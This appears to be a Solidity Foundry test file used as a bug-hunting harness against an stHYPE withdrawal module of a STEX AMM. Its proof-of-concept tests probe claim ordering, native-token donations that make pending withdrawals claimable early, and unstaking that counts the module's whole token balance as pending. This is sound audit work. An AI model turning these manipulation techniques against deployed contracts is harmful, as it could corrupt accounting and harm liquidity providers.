// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import {Test} from "forge-std/Test.sol";
import {ERC20Mock} from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";

import {stHYPEWithdrawalModule} from "src/withdrawal-modules/stHYPEWithdrawalModule.sol";
import {LPWithdrawalRequest} from "src/structs/WithdrawalModuleStructs.sol";
import {MockOverseer} from "src/mocks/sthype/MockOverseer.sol";
import {MockStHype} from "src/mocks/sthype/MockStHype.sol";
import {WETH} from "@solmate/tokens/WETH.sol";

/// @dev Mock pool with isLocked
contract MockPool {
    bool private _isLocked = false;
    function isLocked() external view returns (bool) { return _isLocked; }
    function setIsLocked(bool v) external { _isLocked = v; }
}

/// @notice Exploit harness: test contract plays the STEX AMM role (like the repo's own tests).
/// Targets:
/// V1: claim() checkpoint ordering — can an early request be claimed out of order / double-counted?
/// V2: update() partial fill accounting vs cumulative checkpoints.
/// V3: stakeToken1() mints stHYPE to `pool` — who accounts for it?
/// V4: withdrawToken1FromLendingPool balance-delta check manipulation.
/// V5: unstakeToken0Reserves uses FULL balanceOf(this) instead of the requested amount.
contract StexHuntTest is Test {
    stHYPEWithdrawalModule wm;

    WETH weth;
    MockStHype stHypeToken;
    MockOverseer overseer;
    MockPool mockPool;

    address owner = makeAddr("OWNER");
    address wstHYPE = makeAddr("WSTHYPE");
    address alice = makeAddr("ALICE");
    address bob = makeAddr("BOB");
    address attacker = makeAddr("ATTACKER");

    function setUp() public {
        stHypeToken = new MockStHype();
        weth = new WETH();
        overseer = new MockOverseer(address(stHypeToken));
        mockPool = new MockPool();

        vm.deal(address(this), 1000 ether);
        weth.deposit{value: 300 ether}();

        wm = new stHYPEWithdrawalModule(address(overseer), wstHYPE, owner);
        // setSTEX sets pool via ISTEXAMM(stex).pool()
        vm.prank(owner);
        wm.setSTEX(address(this));
    }

    // ===== AMM mock functions (test contract IS the stex) =====

    function withdrawalModule() external view returns (address) { return address(wm); }
    function token0() external view returns (address) { return address(stHypeToken); }
    function token1() external view returns (address) { return address(weth); }
    function pool() external view returns (address) { return address(mockPool); }
    function supplyToken1Reserves(uint256 amount) external {
        weth.transfer(msg.sender, amount);
    }

    uint256 public unstakedAmount;

    function unstakeToken0Reserves(uint256 _unstakeAmountToken0) external {
        // Real STEXAMM pulls token0 from pool reserves and sends to msg.sender (the module).
        // Mock: transfer stHYPE from this test contract (acting as pool) to the module.
        unstakedAmount = _unstakeAmountToken0;
        stHypeToken.transfer(msg.sender, _unstakeAmountToken0);
    }

    /// @dev Simulate a burn request as the AMM would during LP withdraw().
    function _burn(address recipient, uint256 amountToken0) internal {
        vm.startPrank(address(this));
        // call through the AMM facade: wm.burnToken0AfterWithdraw is onlySTEX, msg.sender == this == stex
        (bool ok,) = address(wm).call(
            abi.encodeWithSelector(bytes4(keccak256("burnToken0AfterWithdraw(uint256,address)")), amountToken0, recipient)
        );
        require(ok, "burn failed");
        vm.stopPrank();
    }

    /// @dev Fund the module with native token (simulating settled unstakes from Overseer)
    function _settleNative(uint256 amount) internal {
        (bool ok,) = address(wm).call{value: amount}("");
        require(ok, "fund failed");
    }

    // ==================== V1: claim ordering ====================
    // Requests A=10 (id 0), B=5 (id 1). Settle native 15 -> both claimable.
    // cumulativeClaimable = 15. Checkpoints: A@0 needs 10 <= 15 ok. B@10 needs 15 >= 15 ok.
    // Now settle only 5 more later; C=7 created BEFORE that settlement (checkpoint 15).
    // After settling 5: cumulativeClaimable = 20 >= 15+7=22? No -> blocked. Correct FIFO.
    // BUT what if update() is called TWICE between requests? cumulative keeps growing correctly?
    function test_V1_claimOrdering() public {
        _burn(alice, 10 ether); // id 0, checkpoint 0
        _burn(bob, 5 ether);    // id 1, checkpoint 10

        _settleNative(6 ether);
        wm.update();
        // pending was 15, excess 6 -> partial fill: claimable += 6, pending = 9
        assertEq(wm.amountToken1ClaimableLPWithdrawal(), 6 ether);
        assertEq(wm.amountToken1PendingLPWithdrawal(), 9 ether);

        // alice claims her 10? claimable=6 < 10 -> reverts (correct FIFO behavior)
        vm.prank(attacker);
        vm.expectRevert(stHYPEWithdrawalModule.stHYPEWithdrawalModule__claim_InsufficientAmountToClaim.selector);
        wm.claim(0);

        // settle more
        _settleNative(9 ether);
        wm.update();
        assertEq(wm.amountToken1ClaimableLPWithdrawal(), 15 ether);

        // NOW alice can claim even though bob's request (id 1) was created first-in-queue after her
        vm.prank(attacker);
        wm.claim(0);
        assertEq(address(alice).balance, 10 ether);

        // bob still claimable
        vm.prank(bob);
        wm.claim(1);
        assertEq(address(bob).balance, 5 ether);
    }

    // ==================== V2: donation inflates excess balance ====================
    // If ANYONE donates native to the module, update() treats it as settled unstake funds:
    // - reduces _amountToken0PendingUnstaking (accounting corruption), and
    // - marks pending LP withdrawals as claimable EARLY (before actual unstake settles).
    // Attacker cannot steal, but can corrupt accounting & accelerate queue priority.
    // More interesting: does donation let attacker's OWN withdrawal skip ahead of honest LPs?
    function test_V2_donation_skipsQueue() public {
        // Honest LPs first
        _burn(alice, 10 ether); // id 0 checkpoint 0
        _burn(bob, 10 ether);   // id 1 checkpoint 10

        // Attacker creates his request AFTER theirs
        _burn(attacker, 1 wei); // id 2, checkpoint 20

        // Nothing has been unstaked/settled yet. Queue order: alice, bob, attacker.
        // Attacker DONATES 10 ether native directly to the module.
        (bool ok,) = address(wm).call{value: 10 ether}("");
        assertTrue(ok);

        // Keeper calls update() (permissionless!)
        wm.update();

        // Donation got absorbed: claimable += 10, pending reduced 20->10
        assertEq(wm.amountToken1ClaimableLPWithdrawal(), 10 ether, "donation became claimable");

        // Alice (FIFO head) can now claim 10 of her 10... fine for her.
        // But wait: attacker only needed 1 wei claimable. Checkpoint math:
        // attacker needs cumulativeClaimable >= 20 + tiny. Not yet.

        // Donate again 11 ether: total donated 21 > pending 20
        (ok,) = address(wm).call{value: 11 ether}("");
        assertTrue(ok);
        wm.update();

        // All pending marked claimable: cumulativeClaimable = 31
        assertEq(wm.amountToken1ClaimableLPWithdrawal(), 20 ether + 1 wei, "all claimable via donations");
        assertEq(wm.amountToken1PendingLPWithdrawal(), 0);

        // Attacker claims LAST in FIFO but only paid ~21 ETH for a 1 wei position...
        // He effectively GIFTED the earlier LPs their payout. No theft. But:
        // _amountToken0PendingUnstaking also corrupted if there was any real pending unstake.
        vm.prank(alice);
        wm.claim(0);
        vm.prank(bob);
        wm.claim(1);
        vm.prank(attacker);
        wm.claim(2);
        assertEq(address(attacker).balance, 1 wei);
    }

    // ==================== V3: REAL accounting corruption via donation ====================
    // unstakeToken0Reserves records FULL token0 BALANCE of the module as pending-unstaking,
    // not the requested amount! Line 559-561:
    //   uint256 amountToken0 = IstHYPE(token0).balanceOf(address(this));
    //   _amountToken0PendingUnstaking += amountToken0;
    // If module holds token0 NOT from this unstake (e.g., donation, or leftover),
    // it gets counted into pendingUnstaking. Then update() subtracts native balance from it...
    // Interplay: donation of NATIVE reduces pendingUnstaking view -> understates locked reserves
    // -> deposit()/withdraw() share pricing sees MORE available assets than reality.
    function test_V3_unstakeCountsWholeBalance() public {
        // Test contract (as pool) holds token0 reserves to be pulled during unstake
        vm.deal(address(this), 10 ether);
        stHypeToken.mint{value: 3 ether}(address(this));

        // Someone donates 5 ether worth of stray token0 to the module (not from unstake)
        vm.deal(owner, 5 ether);
        vm.prank(owner);
        stHypeToken.mint{value: 5 ether}(owner);
        vm.prank(owner);
        stHypeToken.transfer(address(wm), 5 ether);

        // owner unstakes 3 ether worth from the pool reserves
        vm.prank(owner);
        wm.unstakeToken0Reserves(3 ether);

        // BUG CHECK: how much is recorded as pending?
        // Expected: 3 ether (the unstaked amount).
        // Actual: balanceOf(module) = 5 + 3 = 8 ether!
        emit log_named_uint("pendingUnstaking recorded", wm.amountToken0PendingUnstakingBeforeUpdate());
        emit log_named_uint("expected", 3 ether);
        // The stray 5 ether is now double-counted as "locked pending unstaking"
    }

    // Fallbacks so this contract can receive/send ETH
    receive() external payable {}
}
